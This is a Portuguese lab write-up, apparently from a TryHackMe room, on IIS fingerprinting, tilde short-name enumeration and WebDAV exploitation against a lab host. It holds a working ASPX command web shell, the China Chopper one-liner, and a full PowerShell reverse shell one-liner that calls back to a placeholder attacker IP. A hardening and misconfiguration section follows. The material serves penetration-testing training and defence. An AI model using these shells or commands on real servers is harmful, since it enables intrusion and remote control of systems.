<!--
title: IIS (INTERNET INFORMATION SERVICES)
desc: Auditoria, varredura de vulnerabilidades comuns e hardening em servidores web Microsoft IIS.
tags: windows, iis, webserver
readTime: 5 min
-->

<!-- ===================================== -->
<!--   IIS (INTERNET INFORMATION SERVICES) -->
<!-- ===================================== -->
<p align="center">
  <img src="https://img.shields.io/badge/Category-Offensive%20Security-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Focus-Web%20Security-blue?style=for-the-badge">
</p>
<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%20Server-black?style=flat-square">
  <img src="https://img.shields.io/badge/Discipline-Penetration%20Testing-purple?style=flat-square">
  <img src="https://img.shields.io/badge/Level-Intermediate%20→%20Advanced-yellow?style=flat-square">
  <img src="https://img.shields.io/badge/Status-Lab%20Documentation-green?style=flat-square">
</p>

---
 
# 📚 IIS (Internet Information Services)
## Fingerprinting, Enumeração e Exploração em Ambientes Windows
> Um mergulho técnico no servidor web da Microsoft: da identificação de versão ao abuso de WebDAV, passando por enumeração de nomes curtos e execução de web shells.
 
---
# IIS (Internet Information Services)

## Introdução

![](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCmtxM2JMCpvOsc8S_RDPCfPS5HIuD7jcDG5phRNPfDkAnrQRJEgpRQe4&s=10)

### O IIS no Contexto de Segurança

O **Internet Information Services (IIS)** é o servidor web da Microsoft, instalado em praticamente todos os servidores Windows que executam aplicações web, portais de intranet ou APIs REST. Ao contrário de servidores web independentes como Apache ou Nginx, o IIS é **fortemente integrado** à:

- **Autenticação do Windows** (NTLM, Kerberos)
- **Active Directory** (AD)
- **Runtime do .NET Framework** e .NET Core

Essa integração profunda torna o IIS um **alvo de alto valor** para atacantes que buscam:

- Acesso inicial a redes corporativas
- Persistência em ambientes Windows
- Movimento lateral através de domínios

### Incidentes Reais Envolvendo IIS

|Incidente|Ano|Grupo|Impacto|
|---|---|---|---|
|**ProxyLogon**|2021|HAFNIUM|Web shells ASPX em servidores Exchange|
|**CVE-2019-18935**|2019-2023|APT + múltiplos grupos|Desserialização .NET via Telerik UI em IIS governamentais EUA|
|**Ataques a IIS**|2023|Lazarus|Acesso inicial e distribuição de malware|

O [Alerta CISA AA23-074A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-074a) documentou vários agentes de ameaça explorando vulnerabilidades em componentes hospedados em servidores IIS do governo dos EUA. Os agentes obtiveram **execução remota de código** por meio do processo `w3wp.exe` e implantaram DLLs maliciosas para garantir persistência.

---
## Fingerprinting e Enumeração do IIS

### Por que o Fingerprinting é Crucial?

Antes de utilizar um exploit ou enviar um shell, atacantes dedicam tempo para **compreender o alvo**. No caso do IIS, isso é ainda mais crítico porque:

- A **versão do IIS** indica quais CVEs são aplicáveis
- A **presença do WebDAV** sugere um caminho direto para upload de arquivos
- Os **métodos HTTP aceitos** revelam quais operações são possíveis
- A **arquitetura** determina o contexto de execução de shells

Todas essas informações são obtidas **lendo cabeçalhos** e executando algumas ferramentas básicas, deixando, na maioria das vezes, **rastros mínimos** nos logs do servidor.

### O que os Números de Versão do IIS Revelam

Os números de versão do IIS correspondem diretamente às versões do Windows Server. Isso é relevante porque:

- Muitas CVEs são específicas de determinadas versões
- Muitas organizações executam o IIS em servidores **sem suporte**

|Versão do IIS|Windows Server|Status|Observações|
|---|---|---|---|
|**IIS 6.0**|Server 2003|❌ Fim da vida útil (julho/2015)|CVE-2017-7269 - sem patch oficial|
|**IIS 7.0 / 7.5**|Server 2008 / 2008 R2|❌ Fim da vida útil|Vulnerabilidades conhecidas|
|**IIS 8.0 / 8.5**|Server 2012 / 2012 R2|❌ Fim da vida útil|Ainda comum em ambientes legados|
|**IIS 10.0**|Server 2016, 2019, 2022|✅ Atual|Alvo do laboratório|

> **Nota:** O IIS não utilizou a versão 9.x. A numeração saltou diretamente de 8.5 para 10.0 com o lançamento do Windows Server 2016.

**Regra de ouro:** Se você encontrar `IIS/6.0` em um servidor acessível publicamente, **considere-o comprometido** até que se prove o contrário. Não existe patch oficial da Microsoft para a CVE-2017-7269, que afeta especificamente o IIS 6.0.

### Arquitetura do IIS - Aspectos Relevantes para Ataques

Compreender o fluxo de requisições ajuda a identificar onde as vulnerabilidades residem e por que determinados ataques funcionam. Uma requisição que chega a um servidor IIS passa por várias camadas:

```text
[Cliente] → HTTP.sys (Kernel) → IIS (User Mode) → Application Pool → ASP.NET Runtime
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1778090380771.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1778090380771.png)

**Componentes Críticos para Segurança:**

|Componente|Descrição|Implicação de Segurança|
|---|---|---|
|**HTTP.sys**|Driver de modo kernel que recebe todo tráfego HTTP|Vulnerabilidades (ex: CVE-2022-21907) causam BSOD (Blue Screen of Death)|
|**Application Pools**|Contêineres de isolamento, cada um com seu processo `w3wp.exe`|Identidade do processo determina privilégios do shell|
|**[ASP.NET](https://asp.net/) Runtime**|Executa código .NET dentro do processo|Web shells ASPX executam neste contexto|

#### Contexto de Execução de Web Shells

- No **IIS 7.5+**, a identidade padrão é `ApplicationPoolIdentity` (conta virtual `IIS APPPOOL\<nome do pool>`)
- Tanto `ApplicationPoolIdentity` quanto `NETWORK SERVICE` possuem o privilégio **`SeImpersonatePrivilege`** por padrão
- Este privilégio permite ataques de escalonamento do tipo **"Potato"** (PrintSpoofer, JuicyPotato, GodPotato)

### Captura de Banner HTTP (HTTP Banner Grabbing)

A maneira mais rápida de identificar a versão do IIS é ler os cabeçalhos de resposta. O IIS inclui um cabeçalho `Server` em todas as respostas:

```bash
curl -I http://10.65.171.215
```

**Resposta:**

```http
HTTP/1.1 200 OK
Content-Length: 703
Content-Type: text/html
Last-Modified: Mon, 13 Apr 2026 14:05:52 GMT
Accept-Ranges: bytes
ETag: "d5e75da34ecbdc1:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Thu, 25 Apr 2026 09:02:04 GMT
```

**Análise dos Cabeçalhos:**

| Cabeçalho                    | Informação Revelada                      |
| ---------------------------- | ---------------------------------------- |
| `Server: Microsoft-IIS/10.0` | Versão exata do IIS                      |
| `X-Powered-By: ASP.NET`      | Hospeda aplicação .NET                   |
| `X-AspNet-Version`           | Versão do .NET Framework (se presente)   |
| `Persistent-Auth: true`      | Autenticação NTLM persistente habilitada |

### Detecção de WebDAV com OPTIONS

O **Web Distributed Authoring and Versioning (WebDAV)** é uma extensão do HTTP que adiciona verbos de gerenciamento de arquivos:

|Verbo|Função|Risco|
|---|---|---|
|`PUT`|Upload de arquivos|⚠️ Upload de shells|
|`DELETE`|Exclusão de arquivos|⚠️ Destruição de dados|
|`COPY`|Cópia de arquivos|⚠️ Movimento lateral|
|`MOVE`|Movimentação de arquivos|⚠️ Renomeação maliciosa|
|`PROPFIND`|Listagem de propriedades|⚠️ Enumeração|
|`LOCK` / `UNLOCK`|Controle de versão|ℹ️ Baixo risco|

**Casos de uso legítimos:** SharePoint, editores de arquivos baseados na web.

**Quando é um risco:** Quando deixado habilitado em um diretório com permissões de **escrita** e **execução de scripts**, torna-se um caminho direto para upload de shell executável.

#### Verificando Métodos HTTP com OPTIONS

O método HTTP `OPTIONS` solicita que o servidor retorne os métodos que ele suporta:

```bash
curl -X OPTIONS http://10.65.171.215 -sv 2>&1 | grep -E "Allow:|DAV:"
```

**Resposta (WebDAV ativo):**

```text
< Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
< DAV: 1,2,3
```

**Resposta (WebDAV inativo):**

```http
< Allow: GET, HEAD, POST, OPTIONS
```

> ⚠️ **Importante:** Quando você encontrar `PUT`, `MOVE` e `DAV: 1,2` na resposta, o WebDAV está habilitado e você **deve testá-lo** quanto ao acesso de gravação.

### Testando Tipos de Arquivo para Upload e Execução

Saber que o WebDAV está habilitado **não é suficiente**. Você precisa verificar:

1. **Pode carregar arquivos?** (permisão de escrita)
2. **Os arquivos carregados são executados?** (execução de scripts habilitada)

#### Teste de Escrita

```bash
curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" \
  -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' \
  http://10.65.171.215/webdav/test.aspx
```

**Interpretação dos códigos:**

|Código|Significado|Ação|
|---|---|---|
|`201 Created`|✅ Upload bem-sucedido|Prosseguir com shell|
|`401 Unauthorized`|🔑 Autenticação necessária|Encontrar credenciais|
|`403 Forbidden`|❌ Sem permissão de escrita|Abortar esta via|
|`405 Method Not Allowed`|❌ PUT não permitido|Verificar outras vias|

#### Teste de Execução

```bash
curl http://10.65.171.215/webdav/test.aspx
```

**Interpretação:**

| Resposta                    | Significado                                       |
| --------------------------- | ------------------------------------------------- |
| `2` (ou outro resultado)    | ✅ **Executou** - o código foi processado          |
| Código-fonte bruto          | ❌ **Servido estaticamente** - sem execução        |
| `404 Not Found`             | ❌ Arquivo não encontrado (pode ter sido removido) |
| `500 Internal Server Error` | ⚠️ Erro de execução (verificar sintaxe)           |

### Padrões de Tráfego: Normal vs. Suspeito

Atuar em um engajamento envolve interpretar padrões de tráfego. Veja o que observar ao analisar logs de acesso do IIS:

|Padrão|Normal|Suspeito|
|---|---|---|
|**Métodos HTTP**|`GET`, `POST`, `HEAD`|`OPTIONS` com `DAV:`; `PUT`, `MOVE`, `PROPFIND`|
|**Caminhos URI**|`.htm`, `.aspx`, `.js`, `.css`|Caminhos com `~`; `.aspx` em diretórios com permissão de escrita|
|**Códigos de status**|200, 304, 301, 302, 404|`201 Created` (upload via PUT); PUT/DELETE em logs|
|**Cabeçalho Server**|Presente, versão esperada|Oculto ou `IIS/6.0` (fim de vida útil)|

---
## Enumeração de Nomes de Arquivo Curtos (Tilde)

### O Problema dos Nomes de Arquivo Curtos (Formato 8.3)

O Windows herdou o formato de nome de arquivo 8.3 do DOS. Nesse formato:

- Nome: máximo **8 caracteres**
- Extensão: máximo **3 caracteres**

O Windows gera nomes de arquivo curtos (no padrão 8.3) para **cada arquivo** criado em volumes NTFS. Este é o comportamento **padrão** na maioria das instalações do Windows Server, embora versões mais recentes às vezes desabilitem essa funcionalidade.

#### Regra de Conversão

1. Pegue os primeiros 6 caracteres do nome longo
2. Acrescente `~1` (ou `~2`, `~3` em caso de conflito)
3. Mantenha os primeiros 3 caracteres da extensão

**Exemplos:**

| Nome Longo               | Nome Curto (8.3) |
| ------------------------ | ---------------- |
| `BackupFiles`            | `BACKUP~1`       |
| `AdminPortal`            | `ADMINI~1`       |
| `users_backup.xlsx`      | `USERS_~1.XLS`   |
| `configuration.asp`      | `CONFIG~1.ASP`   |
| `very_long_filename.txt` | `VERYLO~1.TXT`   |

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1778160181096.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1778160181096.png)

### Como a Vulnerabilidade Funciona

Quando o IIS recebe uma solicitação com um caractere `~` no caminho, ele processa em relação ao namespace de nomes curtos (formato 8.3). O comportamento crítico:

1. Caminho com til que **corresponde** a um nome curto real → resposta diferente
2. Caminho com til que **não corresponde** a nada → resposta diferente

Essa diferença é **pequena, mas detectável**. Um scanner explora essa diferença para:

1. Reconstruir nomes curtos completos **caractere por caractere**
2. A partir do nome curto, **deduzir** o nome completo

**Exemplo de enumeração:**

Se o scanner determinar que:

- `/BACKUP~1/` → erro `404` com corpo X
- `/ZZZZZZ~1/` → erro `404` com corpo Y (diferente)

Ele identifica que `BACKUP~1` existe. O atacante então sabe que existe um diretório cujo nome começa com `BACKUP` e pode tentar acessá-lo.

#### Versões Afetadas

Esta vulnerabilidade é conhecida desde sua divulgação pública inicial em **2012** (descoberta em 2010) e afeta:

|Versão|Afetada?|
|---|---|
|IIS 5.x|✅ Sim|
|IIS 6.x|✅ Sim|
|IIS 7.x|✅ Sim|
|IIS 8.x|✅ Sim|
|IIS 10.0|✅ Sim (incluindo Server 2022)|

> **Nota:** A Microsoft optou por **não corrigir** a falha. A mitigação recomendada é desabilitar a criação de nomes 8.3 no Registro do Windows.

### Varredura com iis_shortname_scan.py

O scanner utilizado é o `iis_shortname_scan.py`, uma ferramenta em Python que:

- Sonda o servidor **caractere por caractere**
- Reconstrói nomes curtos com base nas diferenças de resposta
- **Não requer** Java Runtime Environment (JRE)

#### Executando no AttackBox

```bash
cd /opt/IIS_shortname_Scanner
python3 iis_shortname_scan.py http://10.65.171.215/
```

**Saída:**

```text
Server is vulnerable, please wait, scanning...
[+] /a~1.* [scan in progress]
[+] /b~1.* [scan in progress]
[+] /as~1.* [scan in progress]
[+] /ba~1.* [scan in progress]
[+] /asp~1.* [scan in progress]
[+] /bac~1.* [scan in progress]
[+] /aspn~1.* [scan in progress]
[+] /back~1.* [scan in progress]
[+] /aspne~1.* [scan in progress]
[+] /backu~1.* [scan in progress]
[+] /aspnet~1.* [scan in progress]
[+] /backup~1.* [scan in progress]
[+] /aspnet~1 [scan in progress]
[+] Directory /aspnet~1 [Done]
[+] /backup~1 [scan in progress]
[+] Directory /backup~1 [Done]
----------------------------------------------------------------
Dir: /aspnet~1
Dir: /backup~1
----------------------------------------------------------------
2 Directories, 0 Files found in total
Note that * is a wildcard, matches any character zero or more times.
```

**Análise da saída:**

|Elemento|Significado|
|---|---|
|`[scan in progress]`|Verificações ativas, cada uma é uma requisição HTTP|
|`[Done]`|Nome completo confirmado sem curingas|
|`Dir: /aspnet~1`|Diretório descoberto|
|`File: exemplo~1.TXT`|Arquivo descoberto (se presente)|

### Interpretando Nomes Curtos Descobertos

|Nome Curto Descoberto|Provável Nome Completo|Por que é Importante|
|---|---|---|
|`BACKUP~1/`|`BackupFiles/`, `Backup_2024/`|Dados de backup, provavelmente sensíveis|
|`ADMINI~1/`|`AdminInterface/`, `Administration/`|Painel administrativo, acesso restrito|
|`CONFIG~1.ASP`|`configuration.asp`, `config_old.asp`|Pode conter credenciais|
|`USERS_~1.XLS`|`users_backup.xlsx`|Exportação de dados de usuários, alto valor|

> **Nota:** O nome parcial, por si só, constitui uma etapa de reconhecimento. O conteúdo real do recurso descoberto é o que o atacante busca em seguida.

### Enumerando o Diretório Descoberto

O nome curto `backup~1` indica que o nome do diretório começa com `backup`:

```bash
curl http://10.65.171.215/BackupFiles/
```

**Resposta com listagem de diretório habilitada:**

```html
<html>
	<head>
	    <title>10.65.171.215 - /BackupFiles/</title>
	</head>
	<body>
	    <H1>10.65.171.215 - /BackupFiles/</H1>
	    <hr>
	
	    <pre><A HREF="/">[To Parent Directory]</A><br><br> 4/13/2026  2:25 PM           14 <A HREF="/BackupFiles/site-backup.cfg">site-backup.cfg</A><br> 4/25/2026 11:31 AM          168 <A HREF="/BackupFiles/web.config">web.config</A><br> 4/25/2026 11:04 AM           91 <A HREF="/BackupFiles/webdav_notes.txt">webdav_notes.txt</A><br></pre>
	    <hr>
	</body>
</html>     
```

**Arquivos descobertos:**

- `site-backup.cfg` - Configuração de backup
- `web.config` - Configuração [ASP.NET](https://asp.net/) (pode conter credenciais)
- **`webdav_notes.txt`** - Notas sobre WebDAV (contém credenciais!)

#### Obtendo o Arquivo de Credenciais

```bash
curl http://10.65.171.215/BackupFiles/webdav_notes.txt
```

```text
WebDAV setup notes
Directory: /webdav/
Username: webdav_user
Password: P@ssw0rd!123
```

✅ **Credenciais obtidas!** Agora podemos explorar o WebDAV.

---
## Exploração do WebDAV: Upload de um Shell ASPX

### Pré-requisitos para o Ataque

Três condições devem ser atendidas **simultaneamente**:

1. ✅ **WebDAV habilitado** no diretório de destino
2. ✅ **Credenciais válidas** com **permissão de escrita** no diretório WebDAV
3. ✅ **Execução de scripts configurada**: IIS encaminha `.aspx` ao [ASP.NET](https://asp.net/)

Se qualquer um desses requisitos não for atendido, o ataque falhará.

### Preparando o Shell ASPX

Salve o conteúdo abaixo como `cmd.aspx` na sua AttackBox:

```aspx
<%@ Page Language="C#" %>
<%
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
  }
%>
```

**Explicação do Código:**

|Linha|Função|
|---|---|
|`Language="C#"`|Define o idioma do código|
|`Request.QueryString["cmd"]`|Lê o parâmetro `cmd` da URL|
|`Process.StartInfo`|Configura execução do `cmd.exe`|
|`RedirectStandardOutput`|Captura a saída do comando|
|`Response.Write`|Exibe a saída na página|

### Enviando a Shell com Autenticação NTLM

O IIS protege o diretório `/webdav/` com **Autenticação do Windows**. Usuários anônimos só podem realizar operações de leitura (`GET`), enquanto operações de escrita (`PUT`, `DELETE`, `MOVE`) exigem uma identidade válida do Windows.

**O protocolo NTLM** comprova essa identidade sem transmitir a senha em texto simples. O parâmetro `--ntlm` no curl instrui a ferramenta a utilizar esse protocolo.

```bash
curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx \
  http://10.65.171.215/webdav/cmd.aspx
```

**Resposta (sucesso):**

```text
* Server auth using NTLM with user 'webdav_user'
> PUT /webdav/cmd.aspx HTTP/1.1
> Authorization: NTLM TlRMTVNTUAABAAAABoIIAAAAAAAAAAAAAAAAAAAAAAA=
...
< HTTP/1.1 100 Continue
* We are completely uploaded and fine
< HTTP/1.1 201 Created
< Server: Microsoft-IIS/10.0
< Persistent-Auth: true
```

> `201 Created` confirma que o arquivo foi escrito no servidor.

### Confirmando Execução

```bash
curl "http://10.65.171.215/webdav/cmd.aspx?cmd=whoami"
```

**Resposta:**

```html
<pre>iis apppool\defaultapppool</pre>
```

✅ O shell está sendo executado sob a identidade do processo de trabalho (worker process) do IIS.

> **Solução de problemas:**
> 
> - Resposta em branco → verificar permissão de execução de script
> - Erro 500 → IIS não está encaminhando `.aspx` ao [ASP.NET](https://asp.net/)
> - Código-fonte bruto → execução de script desabilitada

---
## Web Shells ASPX

### O que é um Web Shell ASPX

Um web shell ASPX é um arquivo [ASP.NET](https://asp.net/) que:

- Aceita entradas do atacante via HTTP
- Executa comandos no contexto do servidor
- Retorna resultados na resposta HTTP

**Arquitetura de Execução:**

```text
Requisição HTTP → IIS → ASP.NET Handler → w3wp.exe → Comando → Resposta HTTP
```

Quando o IIS recebe uma requisição para `cmd.aspx`:

1. Encaminha para o manipulador do [ASP.NET](https://asp.net/)
2. Compila e executa o código dentro do `w3wp.exe`
3. Código executa sob a identidade do Application Pool

**Importância da Identidade do Pool:**

- `ApplicationPoolIdentity` (padrão) → acesso limitado + `SeImpersonatePrivilege`
- `NETWORK SERVICE` → similar ao padrão
- `SYSTEM` ou Administrador → privilégios elevados imediatos

### Passo 1: Executando Comandos

Com o `cmd.aspx` carregado em `/webdav/`, execute comandos passando-os como parâmetro `cmd`:

```bash
curl "http://10.65.171.215/webdav/cmd.aspx?cmd=whoami"
```

```html
<pre>iis apppool\defaultapppool</pre>
```

**Testes de Reconhecimento:**

```bash
# Identificar o hostname
curl "http://10.65.171.215/webdav/cmd.aspx?cmd=hostname"
# Configuração de rede
curl "http://10.65.171.215/webdav/cmd.aspx?cmd=ipconfig"
# Listar diretórios (codificar espaços como +)
curl "http://10.65.171.215/webdav/cmd.aspx?cmd=dir+C%3A%5C"
```

> **Nota:** Codifique espaços na URL como `+` ou `%20` no parâmetro `cmd`.

### Passo 2: Elevando para Reverse Shell

Um shell via navegador é limitado. Para acesso interativo, use um **reverse shell** do PowerShell.

#### Iniciando o Listener na AttackBox

```bash
nc -lvnp 443
```

> **Por que porta 443?** Tráfego HTTPS de saída quase nunca é bloqueado por firewalls.

#### Comando de Reverse Shell PowerShell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -c `
"$client = New-Object System.Net.Sockets.TCPClient('{CONNECTION_IP}',443);`
$stream = $client.GetStream();`
[byte[]]$bytes = 0..65535|%{0};`
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){`
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);`
$sendback = (iex $data 2>&1 | Out-String );`
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';`
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};`
$client.Close()"
```

**Explicação dos Parâmetros:**

- `-NoP` → ignora perfil do PowerShell
- `-NonI` → executa de forma não interativa
- `-W Hidden` → oculta a janela
- `-Exec Bypass` → substitui política `Restricted`

#### Executando no AttackBox

Substitua `{CONNECTION_IP}` pelo IP da sua AttackBox ou pelo IP da interface `tun0` (VPN):

```bash
curl -G "http://10.65.171.215/webdav/cmd.aspx" --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('"'"'CONNECTION_IP'"'"',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
```

### Passo 3: Confirmando Privilégios

```bash
whoami /priv
```

**Saída:**

```text
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**O que é `SeImpersonatePrivilege`?**

- Permite que um processo **assuma a identidade** (impersonate) de qualquer usuário
- Fundamental para ferramentas de escalonamento como **PrintSpoofer**, **JuicyPotato**, **GodPotato**
- Estas ferramentas forçam um processo SYSTEM a autenticar em um named pipe
- Então roubam o token SYSTEM resultante

### China Chopper: Web Shells do Mundo Real

Enquanto o shell criado é funcional, agentes de ameaça reais frequentemente utilizam shells muito menores e mais difíceis de detectar.

**O Componente do Servidor (73 bytes):**

```csharp
<%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>
```

**Características:**

|Aspecto|Detalhe|
|---|---|
|**Tamanho**|73 bytes (incluindo quebra de linha)|
|**Linguagem**|JScript (não C#)|
|**Comunicação**|HTTP POST para parâmetro `chopper`|
|**Payloads**|Codificados, dificultando detecção|
|**Histórico**|Documentado desde 2012, usado no ProxyLogon 2021|

**Detecção:** Procure por arquivos ASPX contendo `eval(` ou `execute(`, especialmente em diretórios que não deveriam conter arquivos criados por usuários.

---
## Configurações Incorretas do IIS

### Visão Geral

Diferente de CVEs, configurações incorretas representam a **superfície de ataque mais comum** do IIS em cenários reais. Um testador que ignora essa verificação frequentemente deixa passar as vulnerabilidades mais simples de encontrar.

### Configuração Incorreta 1: Listagem de Diretório Habilitada

**O que é:**  
Quando o IIS não possui um documento padrão (sem `index.html` ou `default.aspx`) e o recurso "Directory Browsing" está habilitado.

**Impacto:**  
Exposição direta de arquivos: backups, configurações, código-fonte.

**Verificação:**

```bash
curl http://10.65.171.215/uploads/
```

**Resposta:**

```html
<html>
	<head>
	    <title>10.65.171.215 - /uploads/</title>
	</head>
	
	<body>
	    <H1>10.65.171.215 - /uploads/</H1>
	    <hr>
	    <pre><A HREF="/">[To Parent Directory]</A><br><br>
		 4/13/2026  2:25 PM           31 <A HREF="/uploads/config.bak">config.bak</A><br>
		 4/13/2026  2:25 PM          168 <A HREF="/uploads/web.config">web.config</A><br></pre>
	</body>
</html>
```

**Arquivos a Procurar:**

|Extensão|Risco|
|---|---|
|`.bak`, `.backup`|Backup de arquivos sensíveis|
|`.config`|Credenciais e configurações|
|`.log`|Logs com informações sensíveis|
|`.zip`, `.rar`|Arquivos compactados com dados|
|`.sql`|Dumps de banco de dados|

### Configuração Incorreta 2: HTTP PUT e DELETE Sem Autenticação

**Verificação:**

```bash
curl -X OPTIONS http://10.65.171.215/ -sv 2>&1 | grep "Allow:"
```

**Resposta (vulnerável):**

```text
< Allow: OPTIONS, TRACE, GET, HEAD, POST, PUT, DELETE
```

**Se PUT/DELETE estiverem na lista:** Upload e exclusão de arquivos sem autenticação.

### Configuração Incorreta 3: Exposição do web.config

**O que é:**  
Arquivo de configuração [ASP.NET](https://asp.net/) contendo:

- Strings de conexão com banco de dados    
- Chaves de API
- Credenciais SMTP
- Chaves de criptografia

**Por que é grave:**  
O IIS normalmente bloqueia `.config` por regra de filtragem, retornando `404`.

**Verificação:**

```bash
curl http://10.65.171.215/web.config
```

**Resposta (vulnerável):**

```xml
<configuration>
  <connectionStrings>
    <add name="DBConn" 
         connectionString="Server=localhost;Database=appdb;User Id=sa;Password=P@ssw0rd!"/>
  </connectionStrings>
  <!-- Outras configurações -->
</configuration>
```

### Configuração Incorreta 4: Mensagens de Erro Detalhadas

**Configuração vulnerável (`web.config`):**

```xml
<system.web>
  <customErrors mode="Off" />
</system.web>
```

**Impacto:**  
Rastreamentos de pilha (stack traces) completos expõem:

- Caminhos de arquivos internos
- Versão do .NET Framework
- Consultas SQL que falharam
- Endereços IP internos

**Configuração segura:**

```xml
<system.web>
  <customErrors mode="On" />
</system.web>
```

> **Padrão [ASP.NET](https://asp.net/):** `RemoteOnly` (protege remotamente, expõe localhost)

### Configuração Incorreta 5: trace.axd Habilitado

**O que é:**  
Manipulador de diagnóstico nativo do [ASP.NET](https://asp.net/).

**Onde acessar:**  
`http://target/trace.axd`

**O que expõe:**

- Cabeçalhos HTTP
- Valores de formulários
- Estado da sessão
- Cookies
- Dados de processamento interno

**Padrão:** Armazena as últimas 50 requisições (`requestLimit="50"`)

**Verificação:**

```bash
curl http://10.65.171.215/trace.axd
```

**Resposta vulnerável:** Código `200` com visualizador de rastreamento.

**Correção:**

```xml
<system.web>
  <trace enabled="false" />
</system.web>
```

### Configuração Incorreta 6: Método TRACE Habilitado

**O que é:**  
Reflete a solicitação recebida de volta para o solicitante.

**Por que é perigoso:**  
Potencial para ataques **Cross-Site Tracing (XST)**.

**Verificação:**

```bash
curl -X TRACE http://10.65.171.215 -sv
```

**Resposta vulnerável:** `200 OK` com a requisição replicada.

**Resposta segura:** `405 Method Not Allowed`

> **Nota:** Navegadores modernos bloqueiam TRACE em requisições AJAX, reduzindo o impacto prático.

### Configuração Incorreta 7: Pool de Aplicativos com Conta Privilegiada

**Padrão seguro:**  
`ApplicationPoolIdentity` (IIS 7.5+) - privilégios reduzidos + `SeImpersonatePrivilege`

**Configuração vulnerável:**

- `SYSTEM`
- `Administrator`
- Conta de Administrador de Domínio

**Verificação:**

```bash
curl "http://10.65.171.215/webdav/cmd.aspx?cmd=whoami"
```

**Resposta (vulnerável):**

```text
nt authority\system
```

**Resposta (segura):**

```text
iis apppool\defaultapppool
```

### Checklist de Configurações Incorretas

- **Listagem de Diretório** - Desabilitar "Directory Browsing"
- **Métodos HTTP** - Remover PUT, DELETE, TRACE se não necessários
- **web.config** - Garantir que o IIS bloqueie acesso a arquivos `.config`
- **Mensagens de Erro** - Definir `customErrors mode="On"` em produção
- **trace.axd** - Definir `<trace enabled="false"/>`
- **Pool Identity** - Nunca usar SYSTEM, Administrador ou AD Admin
- **WebDAV** - Desabilitar se não utilizado; se usado, autenticação forte e permissões mínimas

---
## Automação com Nmap

### Scripts NSE para IIS

O Nmap já vem com scripts que automatizam as verificações manuais:

|Script|Função|
|---|---|
|`http-methods`|Lista métodos HTTP permitidos via OPTIONS|
|`http-webdav-scan`|Detecta WebDAV e verbos suportados|
|`http-iis-webdav-vuln`|Testa CVE-2009-1535 (bypass autenticação IIS 5/6)|
|`http-ntlm-info`|Extrai informações do alvo via desafio NTLM|

### Detecção de Versão

```bash
nmap -sV -p 80 10.65.171.215
```

**Saída:**

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Enumerando Métodos HTTP

```bash
nmap --script http-methods -p 80 10.65.171.215
```

**Saída:**

```text
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
```

> **Observação:** Métodos WebDAV na raiz indicam **configuração global** do WebDAV, não apenas no `/webdav/`.

### Detectando WebDAV

```bash
nmap --script http-webdav-scan -p 80 10.65.171.215
```

**Saída:**

```text
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Date: Wed, 06 May 2026 18:40:54 GMT
|   WebDAV type: Unknown
